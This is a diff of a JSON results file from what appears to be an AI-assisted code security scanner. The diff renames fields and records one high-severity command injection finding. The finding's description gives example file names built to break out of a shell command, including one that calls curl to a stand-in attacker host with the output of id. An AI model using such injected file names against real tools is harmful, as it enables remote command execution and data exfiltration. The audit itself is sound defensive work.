@@ -3,7 +3,7 @@
   "projectId": "deepaudit",
   "candidates": [
     {
-      "vulnSlug": "auth-bypass",
+      "ruleSlug": "auth-bypass",
       "lineNumbers": [
         111,
         246,
@@ -13,7 +13,7 @@
       "matchedPattern": "auth middleware"
     },
     {
-      "vulnSlug": "rce",
+      "ruleSlug": "rce",
       "lineNumbers": [
         211
       ],
@@ -21,17 +21,17 @@
       "matchedPattern": "execSync"
     },
     {
-      "vulnSlug": "insecure-crypto",
+      "ruleSlug": "insecure-crypto",
       "lineNumbers": [
         127,
         204,
         255
       ],
-      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "snippet": "        \"ruleSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
       "matchedPattern": "weak cipher algorithm"
     },
     {
-      "vulnSlug": "insecure-crypto",
+      "ruleSlug": "insecure-crypto",
       "lineNumbers": [
         16
       ],
@@ -39,15 +39,15 @@
       "matchedPattern": "Math.random in security context"
     },
     {
-      "vulnSlug": "agent-tool-definition",
+      "ruleSlug": "agent-tool-definition",
       "lineNumbers": [
         1
       ],
-      "snippet": "import { execSync } from \"node:child_process\";\nimport type { FileRecord, Finding, RefusalReport } from \"@deepaudit/core\";\nimport type { InvestigateResult, RevalidateVerdict } from \"./types.js\";\n",
+      "snippet": "import { execSync } from \"node:child_process\";\nimport type { FileRecord, Violation, RefusalReport } from \"@deepaudit/core\";\nimport type { InvestigateResult, RevalidateVerdict } from \"./types.js\";\n",
       "matchedPattern": "Tool executes shell commands — RCE via prompt injection"
     },
     {
-      "vulnSlug": "agent-tool-definition",
+      "ruleSlug": "agent-tool-definition",
       "lineNumbers": [
         211
       ],
@@ -55,7 +55,7 @@
       "matchedPattern": "Tool executes shell commands — RCE via prompt injection"
     },
     {
-      "vulnSlug": "auth-bypass",
+      "ruleSlug": "auth-bypass",
       "lineNumbers": [
         111,
         251,
@@ -65,7 +65,7 @@
       "matchedPattern": "auth middleware"
     },
     {
-      "vulnSlug": "rce",
+      "ruleSlug": "rce",
       "lineNumbers": [
         213
       ],
@@ -73,17 +73,17 @@
       "matchedPattern": "spawnSync"
     },
     {
-      "vulnSlug": "insecure-crypto",
+      "ruleSlug": "insecure-crypto",
       "lineNumbers": [
         127,
         204,
         260
       ],
-      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "snippet": "        \"ruleSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
       "matchedPattern": "weak cipher algorithm"
     },
     {
-      "vulnSlug": "auth-bypass",
+      "ruleSlug": "auth-bypass",
       "lineNumbers": [
         126,
         284,
@@ -93,7 +93,7 @@
       "matchedPattern": "auth middleware"
     },
     {
-      "vulnSlug": "rce",
+      "ruleSlug": "rce",
       "lineNumbers": [
         244
       ],
@@ -101,25 +101,25 @@
       "matchedPattern": "spawnSync"
     },
     {
-      "vulnSlug": "insecure-crypto",
+      "ruleSlug": "insecure-crypto",
       "lineNumbers": [
         142,
         235,
         293
       ],
-      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "snippet": "        \"ruleSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
       "matchedPattern": "weak cipher algorithm"
     }
   ],
   "lastScannedAt": "2026-05-06T21:46:56.657Z",
   "lastScannedRunId": "20260506214655-aa977d40dc0c6524",
   "fileHash": "c3d4a89a63348d06761abe03f84bb38f2ec50c3a3d1d12bb18dd9f8a3af5ba17",
-  "findings": [
+  "violations": [
     {
       "severity": "HIGH",
-      "vulnSlug": "rce",
+      "ruleSlug": "rce",
       "title": "Command injection via file.filePath in revalidation git log",
-      "description": "`buildRevalidatePrompt` runs ``execSync(`git log --oneline --since=\"3 months ago\" -n 10 -- \"${file.filePath}\"`, { cwd: projectRoot, … })`` to gather git history for the prompt. `file.filePath` comes from a `FileRecord`, which originates from glob results (see scanner index.ts:158 — `relPath` is taken from the filesystem unchanged). A repository containing a file with shell metacharacters in its name (e.g. ``foo`id`.js`` or ``foo\";curl http://attacker/$(id);\"``) yields a `filePath` that, when interpolated into the shell command string, breaks out of the double-quoted argument and executes attacker-chosen commands on the scanner host. This runs every revalidation pass. Same root cause as the enrich.ts finding, called out explicitly in CLAUDE.md's threat model.",
+      "description": "`buildRevalidatePrompt` runs ``execSync(`git log --oneline --since=\"3 months ago\" -n 10 -- \"${file.filePath}\"`, { cwd: projectRoot, … })`` to gather git history for the prompt. `file.filePath` comes from a `FileRecord`, which originates from glob results (see scanner index.ts:158 — `relPath` is taken from the filesystem unchanged). A repository containing a file with shell metacharacters in its name (e.g. ``foo`id`.js`` or ``foo\";curl http://attacker/$(id);\"``) yields a `filePath` that, when interpolated into the shell command string, breaks out of the double-quoted argument and executes attacker-chosen commands on the scanner host. This runs every revalidation pass. Same root cause as the enrich.ts violation, called out explicitly in CLAUDE.md's threat model.",
       "lineNumbers": [
         211
       ],
@@ -146,7 +146,7 @@
         "model": "claude-opus-4-7"
       },
       "agentSessionId": "8065c73f-0323-4e92-b23a-ddf054c61090",
-      "findingCount": 1,
+      "violationCount": 1,
       "numTurns": 10,
       "costUsd": 2.08821755,
       "usage": {
@@ -171,7 +171,7 @@
         "model": "gpt-5.5"
       },
       "agentSessionId": "019dff47-8e1a-7420-b92b-51642164ef5d",
-      "findingCount": 0,
+      "violationCount": 0,
       "numTurns": 0.2,
       "phase": "process",
       "costUsd": 0.090545,
@@ -198,7 +198,7 @@
         "model": "gpt-5.5"
       },
       "agentSessionId": "019dff7d-f508-7510-87c8-7a9911228550",
-      "findingCount": 1,
+      "violationCount": 1,
       "numTurns": 0.5,
       "phase": "revalidate",
       "costUsd": 0.257763,
